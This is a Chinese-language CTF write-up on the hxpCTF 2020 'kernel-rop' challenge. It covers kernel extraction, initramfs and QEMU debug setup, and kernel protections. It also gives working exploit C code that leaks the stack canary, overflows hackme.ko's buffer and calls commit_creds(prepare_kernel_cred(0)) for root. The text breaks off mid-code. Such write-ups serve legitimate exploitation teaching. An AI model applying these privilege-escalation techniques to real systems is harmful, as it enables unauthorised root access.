        <content type="html"><![CDATA[<p>  例题是 hxpCTF 2020 里的 <code>kernel-rop</code>，题目链接：<a href="https://ctftime.org/task/14383">https://ctftime.org/task/14383</a></p><h2 id="会给出的文件"><a href="#会给出的文件" class="headerlink" title="会给出的文件"></a>会给出的文件</h2><p>一般来说，题目会给出几个文件，以该题为例：</p><ul><li><p>vmlinuz：压缩的内核，有时是 <code>bzImage</code> ，因为是压缩文件，所以要提取出内核 ELF 文件，一般会用一段脚本<code>extract-vmlinux.sh</code> 来提取。</p></li><li><p>initramfs.cpio.gz：压缩的 Linux 文件系统，有漏洞的文件也存在其中，所以一开始要解压缩。</p></li><li><p>run.sh：包含 qemu 运行命令的 shell 脚本，我们可以在这里更改 qemu 和 Linux 启动配置。</p></li></ul><h2 id="初始工作"><a href="#初始工作" class="headerlink" title="初始工作"></a>初始工作</h2><p>Linux 内核，通常以 vmlinuz 或 bzImage 的名称给出，是称为 vmlinux 的内核映像的压缩版本。一般用脚本 <code>extract-vmlinux.sh</code> 提取出内核 ELF 文件 <code>vmlinux </code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux.sh ./vmlinuz &gt; vmlinux</span><br></pre></td></tr></table></figure><p>extract-vmlinux.sh：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Inspired from extract-ikconfig</span></span><br><span class="line"><span class="comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># Use readelf to check if it&#x27;s a valid ELF</span></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span></span><br><span class="line"><span class="comment">#       and not just an elf</span></span><br><span class="line">readelf -h <span class="variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line">cat <span class="variable">$1</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span></span><br><span class="line"><span class="comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Try to find the header ($1) and decompress from here</span></span><br><span class="line"><span class="keyword">for</span>pos <span class="keyword">in</span> `tr <span class="string">&quot;<span class="variable">$1</span>\n<span class="variable">$2</span>&quot;</span> <span class="string">&quot;\n<span class="variable">$2</span>=&quot;</span> &lt; <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | grep -abo <span class="string">&quot;^<span class="variable">$2</span>&quot;</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">pos=<span class="variable">$&#123;pos%%:*&#125;</span></span><br><span class="line">tail -c+<span class="variable">$pos</span> <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | <span class="variable">$3</span> &gt; <span class="variable">$tmp</span> 2&gt; /dev/null</span><br><span class="line">check_vmlinux <span class="variable">$tmp</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check invocation:</span></span><br><span class="line">me=<span class="variable">$&#123;0##*/&#125;</span></span><br><span class="line">img=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span>[ <span class="variable">$#</span> -ne 1 -o ! -s <span class="string">&quot;<span class="variable">$img</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$me</span> &lt;kernel-image&gt;&quot;</span> &gt;&amp;2</span><br><span class="line"><span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare temp files:</span></span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;rm -f <span class="variable">$tmp</span>&quot;</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># That didn&#x27;t work, so retry after decompression.</span></span><br><span class="line">try_decompress <span class="string">&#x27;\037\213\010&#x27;</span> xy    gunzip</span><br><span class="line">try_decompress <span class="string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz</span><br><span class="line">try_decompress <span class="string">&#x27;BZh&#x27;</span>          xy    bunzip2</span><br><span class="line">try_decompress <span class="string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma</span><br><span class="line">try_decompress <span class="string">&#x27;\211\114\132&#x27;</span> xy    <span class="string">&#x27;lzop -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="string">&#x27;lz4 -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally check for uncompressed images or objects:</span></span><br><span class="line">check_vmlinux <span class="variable">$img</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bail out:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$me</span>: Cannot find vmlinux.&quot;</span> &gt;&amp;2</span><br></pre></td></tr></table></figure><p>可以使用 Ropper 工具来找到一些 gadget，存放在 rop 文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; rop</span><br></pre></td></tr></table></figure><h3 id="文件系统分析"><a href="#文件系统分析" class="headerlink" title="文件系统分析"></a>文件系统分析</h3><p>因为漏洞文件和一些重要信息存在于 initramfs.cpio.gz 中，所以我们先要解压它，这边使用一个脚本 <code>decompress.sh</code> 解压会更方便</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir initramfs</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line">cp ../initramfs.cpio.gz .</span><br><span class="line">gunzip ./initramfs.cpio.gz</span><br><span class="line">cpio -idm &lt; ./initramfs.cpio</span><br><span class="line">rm initramfs.cpio</span><br></pre></td></tr></table></figure><p>执行完的效果就是，在当前目录下创建了一个 initramfs 文件夹用于存放 initramfs.cpio.gz 解压后的东西，可以将它看成是 Linux 机器上文件系统的根目录。漏洞文件 hackme.ko 也在其中，先将它复制到 initramfs 路径稍后进行分析。</p><p>压缩完的文件夹的中，<code>/etc</code> 文件夹中一般会存放启动后运行的初始化脚本，例如这个题中的 <code>inittab</code> (有的时候会以 init 的名称存放在根目录下)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::once:-sh -c <span class="string">&#x27;cat /etc/motd; setuidgid 1000 sh; poweroff&#x27;</span></span><br></pre></td></tr></table></figure><p>第一行表示执行的文件，我们跟进<code>/etc/init.d</code> 打开 <code>rcS</code> 文件可以发现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">/bin/busybox --install -s</span><br><span class="line"></span><br><span class="line">stty raw -<span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">chown -R 0:0 /</span><br><span class="line"></span><br><span class="line">mkdir -p /proc &amp;&amp; mount -t proc none /proc</span><br><span class="line">mkdir -p /dev  &amp;&amp; mount -t devtmpfs devtmpfs /dev</span><br><span class="line">mkdir -p /tmp  &amp;&amp; mount -t tmpfs tmpfs /tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">chmod 400 /proc/kallsyms</span><br><span class="line"></span><br><span class="line">insmod /hackme.ko</span><br><span class="line">chmod 666 /dev/hackme</span><br></pre></td></tr></table></figure><p>内核在启动后是加载了hackme.ko模块，同时赋予其666的权限。</p><p>第二行有一个很重要的东西就是权限修改的指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setuidgid 1000 sh <span class="comment">#unroot</span></span><br><span class="line">setuidgid 0 sh    <span class="comment">#root</span></span><br></pre></td></tr></table></figure><p>将其改为 0 (即 root 权限），可以方便我们获取有用的信息，例如：</p><ul><li>/proc/kallsyms：列出加载到内核中的所有符号的所有地址。</li><li>/sys/module/core/sections/.text：显示内核 .text 部分的基地址。(有时也可以在运行的内核中直接用<code>lsmod</code>查看)</li></ul><p>当我们对 initramfs 文件夹中内容修改后要进行压缩，这里给出一个一键压缩的脚本 <code>compress.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp -static ./exp</span><br><span class="line">mv ./exp ./initramfs</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; initramfs.cpio.gz</span><br><span class="line">mv ./initramfs.cpio.gz ../</span><br></pre></td></tr></table></figure><p>前两行是编译利用代码并将其放入文件系统。</p><h3 id="qemu-运行脚本"><a href="#qemu-运行脚本" class="headerlink" title="qemu 运行脚本"></a>qemu 运行脚本</h3><p>给出的 <code>run.sh</code> 脚本内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -kernel vmlinuz \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -hdb flag.txt \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti=1 quiet panic=1&quot;</span></span><br></pre></td></tr></table></figure><p>先来看看这些都是啥意思：</p><ul><li><p><code>-m</code> 指定内存大小，如果无法运行模拟器，就把它改大一点</p></li><li><p><code>-CPU</code> 指定 CPU 型号，可以在后面加 SMEP 和 SMAP 保护</p></li><li><p><code>-kernel</code> 指定压缩的内核映像</p></li><li><p><code>-initrd</code> 指定压缩文件系统</p></li><li><p><code>-append</code> 指定额外的引导选项</p></li></ul><p>因为我们要使用 gdb 远程调试，所以要在最后加上参数 <code>-s</code></p><p>最终结果就是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -kernel vmlinuz \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -hdb flag.txt \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti=1 quiet panic=1&quot;</span> \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure><p>之后就可以调试了，现在一个终端中启动程序，再在<strong>另一个终端</strong>中启动 gdb</p><p>调试需要加载 .ko 文件的符号表，可以通过 <code>add-symbol-file hackme.ko textaddr</code> 来加载，textaddr 就是 .text 的基地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdb vmlinux</span><br><span class="line">(gdb) add-symbol-file hackme.ko textaddr</span><br><span class="line">(gdb) target remote localhost:1234</span><br></pre></td></tr></table></figure><h3 id="ropper-得到-gadget"><a href="#ropper-得到-gadget" class="headerlink" title="ropper 得到 gadget"></a>ropper 得到 gadget</h3><p>有时候虚拟机内存设置太小会导致中断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; rop</span><br></pre></td></tr></table></figure><h2 id="内核的保护"><a href="#内核的保护" class="headerlink" title="内核的保护"></a>内核的保护</h2><p>介绍一下内核都有哪些保护：</p><p><code>Stack Canary</code>：顾名思义，和用户态完全相同，无法禁用。</p><p><code>KASLR</code>：内核地址空间布局随机化，类似于用户态的 <code>ASLR</code>，启动时，通过 <code>kaslr</code> 或 <code>nokaslr</code> 在 <code>-append</code> 选项下启用/禁用。</p><p><code>SMEP</code>：处于内核态时无法执行用户态<strong>代码</strong>，通过设置 CR4 寄存器的第 20 位来启用，启动时，通过 <code>+smep</code>  在 <code>-cpu</code> 选项下启用，<code>nosmep</code> 在 <code>-append</code> 选项下禁用。</p><p><code>SMAP</code>：处于内核态时无法执行用户态<strong>数据</strong>，通过设置 CR4 寄存器的第 21 位来启用，同 smep</p><p><code>KPTI</code>：内核页表隔离，通过把进程页表按照用户空间和内核空间隔离成两块来防止内核页表泄露。可以在<code>-append</code>选项下添加 <code>kpti=1</code> 或 <code>nopti</code> 来启用或禁用它。</p><h2 id="分析内核模块"><a href="#分析内核模块" class="headerlink" title="分析内核模块"></a>分析内核模块</h2><p>直接看题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">hackme_write</span><span class="params">(file *f, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">int</span> tmp[<span class="number">32</span>];</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> ( _size &gt; <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        _warn_printk(<span class="string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="number">4096LL</span>, _size);</span><br><span class="line">        BUG();</span><br><span class="line">    &#125;</span><br><span class="line">    _check_object_size(hackme_buf, _size, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(hackme_buf, data, v5) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">    _memcpy(tmp, hackme_buf);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">hackme_read</span><span class="params">(file *f, <span class="keyword">char</span> *data, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">int</span> tmp[<span class="number">32</span>];</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    _memcpy(hackme_buf, tmp);</span><br><span class="line">    <span class="keyword">if</span> ( _size &gt; <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        _warn_printk(<span class="string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="number">4096LL</span>, _size);</span><br><span class="line">        BUG();</span><br><span class="line">    &#125;</span><br><span class="line">    _check_object_size(hackme_buf, _size, <span class="number">1LL</span>);</span><br><span class="line">    v6 = copy_to_user(data, hackme_buf, _size) == <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞很明显，读取/写入了长度为 0x80 字节(32*4)的缓冲区，但在 0x1000 时才警告缓冲区溢出。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>接下来会讲不同的保护开启时，该如何应对。</p><h3 id="仅-Stack-Canary"><a href="#仅-Stack-Canary" class="headerlink" title="仅 Stack Canary"></a>仅 Stack Canary</h3><p>用户态时，做法是泄露 canary 然后栈溢出劫持返回地址；内核态也是一样的。</p><p>先把其他保护都关闭，把 run.sh 改成如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -kernel vmlinuz \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -hdb flag.txt \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 nopti nosmep nosmap nokaslr quiet panic=1&quot;</span> \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure><h4 id="打开设备"><a href="#打开设备" class="headerlink" title="打开设备"></a>打开设备</h4><p>首先要打开设备，在哪看打开的设备呢？</p><p>就是在之前说到的<code>/etc/init.d/rcS</code>，当然不同的题目有不同的路径。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_dev</span><span class="params">()</span></span>&#123;</span><br><span class="line">    global_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (global_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[!] Failed to open device&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Opened device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="泄露-canary"><a href="#泄露-canary" class="headerlink" title="泄露 canary"></a>泄露 canary</h4><p>因为 leak 数组定义的是 unsigned long，每个元素是 8 个字节，所以 canary 会在偏移量为 16 的地方。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cookie;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> leak[n];</span><br><span class="line">    <span class="keyword">ssize_t</span> r = read(global_fd, leak, <span class="keyword">sizeof</span>(leak));</span><br><span class="line">    cookie = leak[<span class="number">16</span>];<span class="comment">//0x80/8=16</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaked %zd bytes\n&quot;</span>, r);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie: %lx\n&quot;</span>, cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h4><p>值得注意的是，在调用 <code>hackme_read</code> 时，多压入了 r12 和 rbx，所以要用 0 进行填充</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/kernel-pwn/1649853236636850/04ba971f0d09d00ea3d785ee0b705e269f873d87.png" alt="image-20220413203356231"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_root; <span class="comment">// ret</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取-root-权限"><a href="#获取-root-权限" class="headerlink" title="获取 root 权限"></a>获取 root 权限</h4><p>调用内核态的函数 <code>commit_creds(prepare_kernel_cred(0))</code>，因为 <code>KASLR</code> 被禁用，所以地址可以直接搜</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep commit_creds</span><br><span class="line">-&gt; ffffffff814c6410 T commit_creds</span><br><span class="line">cat /proc/kallsyms | grep prepare_kernel_cred</span><br><span class="line">-&gt; ffffffff814c67f0 T prepare_kernel_cred</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;movabs rax, 0xffffffff814c67f0;&quot;</span> <span class="comment">//prepare_kernel_cred</span></span><br><span class="line">        <span class="string">&quot;xor rdi, rdi;&quot;</span></span><br><span class="line">    <span class="string">&quot;call rax; mov rdi, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;movabs rax, 0xffffffff814c6410;&quot;</span> <span class="comment">//commit_creds</span></span><br><span class="line">    <span class="string">&quot;call rax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以用另一种方式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff814c6410</span>, prepare_kernel_cred = <span class="number">0xffffffff814c67f0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="comment">/* puts(&quot;[*] root now.&quot;); */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="跳回用户态"><a href="#跳回用户态" class="headerlink" title="跳回用户态"></a>跳回用户态</h4><p>拿到权限后，就需要跳回用户态执行 shell 了，一般会通过 iretq 来返回用户态，iretq 指令会按顺序弹出五个寄存器，所以在栈中按相反的顺序设置相应寄存器就行。</p><p>当然在这之前得先执行一条叫 swapgs 的指令，用于交换内核态和用户态之间的 GS 寄存器。</p><p>利用内联汇编就能省去找地址的过程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 